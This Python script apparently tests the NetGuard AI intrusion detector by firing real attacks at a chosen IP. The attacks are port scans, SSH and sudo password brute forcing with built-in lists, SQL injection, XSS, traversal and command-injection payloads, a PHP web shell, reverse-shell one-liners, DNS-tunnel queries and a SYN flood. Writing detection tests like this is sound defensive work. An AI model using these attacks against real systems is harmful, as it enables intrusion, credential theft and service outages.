#!/usr/bin/env python3
"""
NetGuard AI - Realistic Attack Simulator (VM-safe)
===================================================
Performs actual attacker-style behaviors against a target VM to validate
NetGuard's detection capabilities. This is NOT a toy packet generator:

  - Real TCP connect port scans (full handshake)
  - Real SSH brute-force login attempts
  - Real HTTP exploit requests (SQLi, XSS, LFI, RCE probes)
  - Real reverse-shell C2 traffic
  - Real SMB / RDP / SSH lateral-movement probes
  - Sudo privilege-escalation password guessing

Everything is contained to the IP you specify (default: this VM). No malware
is installed, no files are destroyed, and no traffic leaves the VM unless you
point it at an external IP.

Requirements:
  - Python 3, scapy, requests (installed by NetGuard)
  - paramiko (for real SSH brute-force)
  - root / sudo (for raw-packet modules)

Usage:
  sudo python3 tests/attack_simulator.py --target 127.0.0.1 --test all --duration 120
  sudo python3 tests/attack_simulator.py --target $(hostname -I | awk '{print $1}') --test all
"""

import argparse
import base64
import itertools
import os
import random
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime
from urllib.parse import quote

import requests
from scapy.all import IP, TCP, UDP, DNS, DNSQR, conf, send, get_if_addr


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def get_primary_ip():
    """Detect primary non-loopback IP; fallback to 127.0.0.1."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        for iface in conf.interfaces:
            try:
                ip = get_if_addr(iface)
                if ip and not ip.startswith("127.") and not ip.startswith("0."):
                    return ip
            except Exception:
                continue
    return "127.0.0.1"


def tcp_port_open(target, port, timeout=1):
    """Perform a real TCP connect scan on a single port."""
    try:
        with socket.create_connection((target, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ---------------------------------------------------------------------------
# Module 1: Reconnaissance (real connect scan + SYN sweep)
# ---------------------------------------------------------------------------

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
    993, 995, 1723, 2049, 3306, 3389, 5432, 5900, 5985, 6379,
    8080, 8443, 9200, 10000
]


def module_port_scan(target, duration=30):
    """Real connect scan + SYN sweep."""
    log(f"[RECON] Starting real port scan against {target}")
    end = time.time() + duration
    open_ports = []
    random.shuffle(COMMON_PORTS)

    for port in COMMON_PORTS:
        if time.time() > end:
            break
        # Real connect scan
        if tcp_port_open(target, port, timeout=0.5):
            log(f"[RECON] Port {port}/tcp OPEN")
            open_ports.append(port)
        # SYN sweep (raw)
        try:
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            send(pkt, verbose=0)
        except Exception:
            pass
        time.sleep(0.05)

    log(f"[RECON] Scan complete. Open ports found: {open_ports if open_ports else 'none'}")


# ---------------------------------------------------------------------------
# Module 2: SSH brute-force (real paramiko login attempts)
# ---------------------------------------------------------------------------

SSH_USERS = ["root", "admin", "user", "test", "ubuntu", "netguard", "oracle"]
SSH_PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "ubuntu",
    "letmein", "12345678", "qwerty", "welcome", "test123",
    "P@ssw0rd", "1234567890", "passw0rd", "netguard"
]


def module_ssh_brute(target, duration=60, max_attempts=50):
    """Perform real SSH authentication attempts."""
    try:
        import paramiko
    except ImportError:
        log("[SSH] paramiko not installed; run: pip install paramiko")
        return

    log(f"[SSH] Starting SSH brute-force against {target}:22")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    attempts = 0
    start = time.time()
    for user, password in itertools.product(SSH_USERS, SSH_PASSWORDS):
        if attempts >= max_attempts or (time.time() - start) > duration:
            break
        try:
            client.connect(target, port=22, username=user, password=password,
                           timeout=3, banner_timeout=5, auth_timeout=3)
            log(f"[SSH] SUCCESS {user}:{password} — would be a breach!")
            client.close()
            break
        except paramiko.AuthenticationException:
            log(f"[SSH] FAILED {user}:{password}")
        except Exception as e:
            log(f"[SSH] ERROR {user}:{password} -> {e}")
            break
        attempts += 1
        time.sleep(0.2)

    log(f"[SSH] Brute-force complete. {attempts} attempts.")


# ---------------------------------------------------------------------------
# Module 3: Web exploitation probes (real HTTP requests)
# ---------------------------------------------------------------------------

WEB_PAYLOADS = [
    # SQL injection
    ("GET", "/login?user=admin' OR '1'='1'--&pass=anything", None),
    ("GET", "/search?q=1' UNION SELECT username,password FROM users--", None),
    ("POST", "/login", {"username": "admin'--", "password": "skip"}),
    ("POST", "/api/auth", {"user": "' OR 1=1--", "pass": "x"}),
    # XSS
    ("GET", "/comment?text=<script>alert('xss')</script>", None),
    ("GET", "/search?q=<img src=x onerror=alert(1)>", None),
    # LFI / directory traversal
    ("GET", "/page?file=../../../../etc/passwd", None),
    ("GET", "/download?file=....//....//etc/shadow", None),
    ("GET", "/view?path=/etc/passwd", None),
    # RCE / command injection probes
    ("GET", "/ping?host=8.8.8.8;cat /etc/passwd", None),
    ("GET", "/exec?cmd=whoami;id", None),
    ("GET", "/api/run?command=nc -e /bin/sh 1.2.3.4 4444", None),
    # Web shells
    ("POST", "/upload", {"file": "<?php system($_GET['cmd']); ?>"}),
]


def module_web_attacks(target, duration=60):
    """Send real malicious HTTP requests."""
    log(f"[WEB] Starting web exploitation probes against http://{target}")
    base_urls = [f"http://{target}", f"http://{target}:8080", f"http://{target}:8443"]
    end = time.time() + duration
    count = 0

    while time.time() < end:
        method, path, data = random.choice(WEB_PAYLOADS)
        base = random.choice(base_urls)
        url = base + (path if path.startswith("/") else "/" + path)
        try:
            if method == "GET":
                r = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0 (AttackBot)"})
            else:
                r = requests.post(url, data=data, timeout=3, headers={"User-Agent": "Mozilla/5.0 (AttackBot)"})
            log(f"[WEB] {method} {url[:80]}... -> status {r.status_code}")
        except requests.exceptions.ConnectionError:
            log(f"[WEB] No web service on {base}")
            time.sleep(2)
        except Exception as e:
            log(f"[WEB] Request error: {e}")
        count += 1
        time.sleep(0.3)

    log(f"[WEB] Web probes complete. {count} requests sent.")


# ---------------------------------------------------------------------------
# Module 4: Reverse shell / C2 simulation
# ---------------------------------------------------------------------------

REVERSE_SHELL_PAYLOADS = [
    b"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
    b"nc -e /bin/sh 127.0.0.1 4444",
    b"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
    b"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"127.0.0.1\",4444);",
]


def start_listener(port=4444, duration=30):
    """Start a simple TCP listener to receive reverse-shell attempts."""
    def _listen():
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(5)
            srv.settimeout(1.0)
            end = time.time() + duration
            while time.time() < end:
                try:
                    conn, addr = srv.accept()
                    log(f"[C2] Reverse connection received from {addr}")
                    conn.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
                    conn.close()
                except socket.timeout:
                    continue
            srv.close()
        except Exception as e:
            log(f"[C2] Listener error: {e}")

    t = threading.Thread(target=_listen, daemon=True)
    t.start()
    return t


def module_reverse_shell(target, duration=45):
    """Simulate reverse-shell callback traffic."""
    log(f"[C2] Starting reverse-shell simulation against {target}")
    listener = start_listener(port=4444, duration=duration + 10)
    time.sleep(1)

    end = time.time() + duration
    count = 0
    while time.time() < end:
        try:
            payload = random.choice(REVERSE_SHELL_PAYLOADS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, 4444))
            s.sendall(payload)
            s.close()
            log(f"[C2] Sent reverse-shell payload ({len(payload)} bytes)")
            count += 1
        except Exception as e:
            log(f"[C2] Connection failed: {e}")
        time.sleep(random.uniform(1.5, 4.0))

    listener.join(timeout=5)
    log(f"[C2] Reverse-shell simulation complete. {count} callbacks.")


# ---------------------------------------------------------------------------
# Module 5: Lateral movement probes
# ---------------------------------------------------------------------------

LATERAL_SERVICES = {
    22: "ssh",
    135: "msrpc",
    139: "netbios",
    445: "smb",
    3389: "rdp",
    5985: "winrm",
}


def module_lateral_movement(target, duration=30):
    """Probe common lateral-movement service ports."""
    log(f"[LATERAL] Probing lateral-movement services on {target}")
    end = time.time() + duration
    count = 0
    ports = list(LATERAL_SERVICES.keys())
    random.shuffle(ports)

    while time.time() < end:
        for port in ports:
            if time.time() > end:
                break
            name = LATERAL_SERVICES[port]
            # Real connect
            if tcp_port_open(target, port, timeout=0.5):
                log(f"[LATERAL] {name} ({port}/tcp) reachable")
            # Raw SYN too
            try:
                pkt = IP(dst=target) / TCP(dport=port, flags="S")
                send(pkt, verbose=0)
            except Exception:
                pass
            count += 1
            time.sleep(0.1)

    log(f"[LATERAL] Lateral-movement probes complete. {count} probes.")


# ---------------------------------------------------------------------------
# Module 6: Privilege escalation / local exploit simulation
# ---------------------------------------------------------------------------

SUDO_PASSWORDS = ["root", "admin", "password", "123456", "toor", "ubuntu", "netguard"]


def module_privesc(duration=30):
    """Simulate local privilege-escalation attempts via sudo password guessing."""
    log("[PRIVESC] Starting sudo password-guessing simulation")
    start = time.time()
    count = 0
    for password in SUDO_PASSWORDS:
        if (time.time() - start) > duration:
            break
        try:
            proc = subprocess.run(
                ["sudo", "-S", "-k", "whoami"],
                input=f"{password}\n",
                capture_output=True,
                text=True,
                timeout=5,
            )
            if proc.returncode == 0:
                log(f"[PRIVESC] SUDO SUCCESS with password: {password}")
                break
            else:
                log(f"[PRIVESC] SUDO FAILED password: {password}")
        except Exception as e:
            log(f"[PRIVESC] Error: {e}")
        count += 1
        time.sleep(0.5)

    log(f"[PRIVESC] Privilege-escalation simulation complete. {count} attempts.")


# ---------------------------------------------------------------------------
# Module 7: DNS tunneling / C2 simulation
# ---------------------------------------------------------------------------

DNS_DOMAINS = [
    "a.badc2.net", "login.attacker.tk", "update.malware-test.xyz",
    "data.exfil-demo.local", "beacon.c2simulator.com"
]


def module_dns_tunnel(target, duration=30):
    """Send encoded data via DNS queries to simulate DNS tunneling."""
    log(f"[DNS] Starting DNS tunnel/C2 simulation against {target}:53")
    end = time.time() + duration
    count = 0
    while time.time() < end:
        domain = random.choice(DNS_DOMAINS)
        # Encode a fake payload chunk in the subdomain
        chunk = base64.b32encode(os.urandom(12)).decode().rstrip("=")
        qname = f"{chunk}.{domain}"
        try:
            pkt = IP(dst=target) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
            send(pkt, verbose=0)
            log(f"[DNS] Query: {qname[:60]}...")
            count += 1
        except Exception as e:
            log(f"[DNS] Error: {e}")
        time.sleep(0.2)

    log(f"[DNS] DNS tunnel simulation complete. {count} queries.")


# ---------------------------------------------------------------------------
# Module 8: SYN flood (raw packet DoS)
# ---------------------------------------------------------------------------

def module_syn_flood(target, dport=80, duration=20):
    """High-rate SYN flood."""
    log(f"[DOS] Starting SYN flood against {target}:{dport}")
    end = time.time() + duration
    count = 0
    while time.time() < end:
        sport = random.randint(40000, 60000)
        try:
            pkt = IP(dst=target) / TCP(sport=sport, dport=dport, flags="S")
            send(pkt, verbose=0)
            count += 1
        except Exception:
            pass
    log(f"[DOS] SYN flood complete. {count} SYN packets.")


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

MODULES = {
    "portscan": module_port_scan,
    "ssh": module_ssh_brute,
    "web": module_web_attacks,
    "reverse_shell": module_reverse_shell,
    "lateral": module_lateral_movement,
    "privesc": module_privesc,
    "dns": module_dns_tunnel,
    "synflood": module_syn_flood,
}


def run_all(target, duration):
    """Run all modules back-to-back, splitting time between them."""
    modules = list(MODULES.values())
    per_module = duration // len(modules)
    log(f"[MAIN] Running full attack chain: {len(modules)} modules, ~{per_module}s each")

    # Recon first
    module_port_scan(target, duration=per_module)
    # Lateral / service discovery
    module_lateral_movement(target, duration=per_module // 2)
    # Brute force
    module_ssh_brute(target, duration=per_module, max_attempts=40)
    # Web exploitation
    module_web_attacks(target, duration=per_module)
    # C2 / reverse shell
    module_reverse_shell(target, duration=per_module)
    # DNS tunnel
    module_dns_tunnel(target, duration=per_module // 2)
    # Privesc local
    module_privesc(duration=per_module // 2)
    # DoS finale
    module_syn_flood(target, dport=80, duration=per_module // 2)

    log("[MAIN] Full attack chain complete.")


def main():
    parser = argparse.ArgumentParser(
        description="NetGuard AI - Realistic VM-safe attack simulator"
    )
    parser.add_argument(
        "--target",
        default=get_primary_ip(),
        help="Target IP (default: this VM's primary IP)",
    )
    parser.add_argument(
        "--test",
        choices=list(MODULES.keys()) + ["all"],
        default="all",
        help="Attack module to run (default: all)",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=120,
        help="Duration in seconds (default: 120)",
    )
    parser.add_argument(
        "--interface",
        default=None,
        help="Network interface for raw packets (optional)",
    )

    args = parser.parse_args()

    if args.interface:
        conf.iface = args.interface

    log("=" * 60)
    log("NetGuard AI Realistic Attack Simulator")
    log("=" * 60)
    log(f"Target    : {args.target}")
    log(f"Module    : {args.test}")
    log(f"Duration  : {args.duration}s")
    log(f"Interface : {conf.iface}")
    log("=" * 60)
    log("")
    log("This tool performs real attack behaviors for detection testing.")
    log("Use ONLY on VMs/hosts you own or have explicit permission to test.")
    log("")

    try:
        if args.test == "all":
            run_all(args.target, args.duration)
        else:
            MODULES[args.test](args.target, args.duration)
    except KeyboardInterrupt:
        log("[MAIN] Interrupted by user")
    finally:
        log("")
        log("=" * 60)
        log("Test finished. Check NetGuard dashboard:")
        log("  - Connections / Threats / Alerts pages")
        log("  - Look for threat levels: HIGH / CRITICAL")
        log("  - Verify GeoIP source countries are populated")
        log("=" * 60)


if __name__ == "__main__":
    main()
